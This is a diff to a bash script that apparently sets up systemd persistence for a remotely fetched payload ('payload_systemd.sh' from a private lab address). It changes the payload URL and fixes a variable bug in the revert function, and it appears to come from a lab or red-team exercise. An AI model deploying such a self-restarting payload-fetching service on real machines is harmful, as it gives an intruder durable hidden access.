@@ -8,7 +8,7 @@ UNIT_PATH="/etc/systemd/system/${SERVICE_NAME}.service"
 SHELL_BIN="/bin/sh"
 RESTART_POLICY="always"
 RESTART_SEC="10"
-DEFAULT_URL="http://192.168.56.2:8000/payloads/payload_systemd.sh"
+DEFAULT_URL="http://192.168.56.2:8000/payload_systemd.sh"
 
 log(){
   echo "[$(date +'%F %T')] $*";
@@ -67,7 +67,7 @@ EOF
 revert_changes(){
   ensure_root --revert 
   log "Stop + disable ${SERVICE_NAME}.service"
-  systemctl disable --now "{SERVICE_NAME}.service" || true 
+  systemctl disable --now "${SERVICE_NAME}.service" || true 
   if [[ -f "$UNIT_PATH" ]]; then 
     log "Suppression ${UNIT_PATH}"
     rm -f "${UNIT_PATH}"
